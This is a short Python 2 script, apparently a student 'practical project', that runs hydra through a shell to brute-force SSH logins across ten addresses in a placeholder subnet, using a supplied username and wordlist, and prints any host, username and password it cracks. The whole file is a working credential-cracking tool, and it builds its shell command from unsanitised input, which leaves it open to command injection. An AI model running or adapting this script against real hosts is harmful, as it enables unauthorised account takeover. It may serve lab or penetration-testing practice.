import subprocess

def main():
    print("= Practical project - Cracking passwords =\n")
    
    username = raw_input("What is the username? ")
    fileName = raw_input("What is the name of the dictionary file? ")
    ip = "xxx.yyy.zzz."
    foundPassword = False

    print "Obtaining the password...\n"

    for x in range(235, 245):

        fullIp = ip + str(x)
        command = "hydra -l " + username + " -P " + fileName + " " + fullIp + " ssh -t 4"
        
        proc = subprocess.Popen([command], stdout=subprocess.PIPE, shell=True)
        (out, err) = proc.communicate()

        if "password:" in out:
            foundPassword = True
            print "Password found!\n"

            words = out.split()

            hostIndex = words.index("host:")
            print "The host is: %s" % (words[hostIndex + 1])
            print "Username: %s" % (words[hostIndex + 3])
            print "Password: %s" % (words[hostIndex + 5])
            break

    if foundPassword:
        print "\nPassword found. End of execution.\n"
    else:
        print "\nAny password found.\n"
            
            
main()
